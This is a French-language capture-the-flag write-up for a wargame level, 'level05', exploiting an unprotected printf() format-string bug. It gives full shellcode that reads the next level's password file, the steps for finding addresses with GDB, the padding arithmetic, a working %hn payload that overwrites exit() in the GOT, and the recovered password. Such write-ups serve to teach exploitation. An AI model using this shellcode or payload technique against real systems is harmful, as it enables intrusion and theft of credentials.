# Level05

## Analyse du binaire

Ce programme lit une entrée utilisateur avec `fgets()`, convertit les majuscules en minuscules, puis l'affiche avec `printf()`.

**Vulnérabilité identifiée :** Format string attack via `printf(buffer)` non protégé.

## Plan d'exploitation

L'objectif est de modifier l'adresse de la fonction `exit()` dans la GOT (Global Offset Table) pour qu'elle pointe vers notre shellcode au lieu de la vraie fonction `exit()`.

### Étape 1 : Créer et exporter le shellcode

Le shellcode ouvre et lit `/home/users/level06/.pass` :
```bash
export SHELLCODE=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass'
```

Les 16 premiers octets (`\x90`) sont des NOPs formant un "NOP sled" pour augmenter les chances d'atteindre le shellcode.

### Étape 2 : Trouver l'adresse du shellcode

Créer un programme pour récupérer l'adresse de la variable d'environnement :
```bash
cat > /tmp/getenv.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    printf("%p\n", getenv("SHELLCODE"));
}
EOF

gcc -m32 /tmp/getenv.c -o /tmp/getenv
/tmp/getenv
```

**Adresse obtenue :** `0xffffd868`

### Étape 3 : Trouver l'adresse de `exit()` dans la GOT

Avec GDB :
```bash
gdb level05
(gdb) disas exit
```

Résultat :
```
0x08048370 <+0>:	jmp    *0x80497e0
```

**Adresse de `exit()` dans la GOT :** `0x80497e0`

### Étape 4 : Localiser notre buffer sur la stack

Tester avec différentes valeurs de `%N$p` pour trouver où notre input apparaît :
```bash
./level05
aaaabbbb%10$p%11$p
```

Résultat : `aaaabbbb0x616161610x62626262`

- `0x61616161` = "aaaa" → position `%10$`
- `0x62626262` = "bbbb" → position `%11$`

Notre buffer est accessible aux positions **10** et **11** de la stack.

### Étape 5 : Calculer les valeurs à écrire

Adresse cible : `0xffffd868`

On découpe en deux parties de 16 bits (little-endian) :
- **LOW**  (2 premiers octets) : `0xd868` = **55,400** en décimal
- **HIGH** (2 derniers octets) : `0xffff` = **65,535** en décimal

On écrit à deux adresses consécutives :
- `0x080497e0` → recevra LOW (`0xd868`)
- `0x080497e2` → recevra HIGH (`0xffff`)

### Étape 6 : Calculer les paddings

Le payload commence par 8 octets (deux adresses de 4 octets) qui comptent comme **8 caractères déjà affichés**.

**Premier padding** (pour atteindre 55400 chars) :
```
55400 - 8 = 55392 chars
```

**Deuxième padding** (pour atteindre 65535 chars) :
```
65535 - 55400 = 10135 chars
```

### Étape 7 : Construction du payload
```python
[Adresse LOW][Adresse HIGH][Padding 55392][%10$hn][Padding 10135][%11$hn]
```

- `\x08\x04\x97\xe0`[::-1] : Adresse de exit() en little-endian
- `\x08\x04\x97\xe2`[::-1] : Adresse de exit()+2 en little-endian
- `%55392d` : Affiche 55392 chars (padding)
- `%10$hn` : Écrit 55400 (0xd868) à l'adresse en position 10
- `%10135d` : Affiche 10135 chars supplémentaires
- `%11$hn` : Écrit 65535 (0xffff) à l'adresse en position 11

### Étape 8 : Exploitation
```bash
python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55392d%10\$hn' + '%10135d%11\$hn'" | ./level05
```

**Résultat :** Le mot de passe s'affiche après quelques secondes.
```
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

### Étape 9 : Passer au niveau suivant
```bash
su level06
```

## Résumé technique

- **Vulnérabilité :** Format string (`printf(buffer)`)
- **Technique :** Modification de la GOT pour rediriger `exit()` vers shellcode
- **Outil :** `%hn` pour écrire 16 bits à la fois
- **Shellcode :** Lecture de `/home/users/level06/.pass` avec NOP sled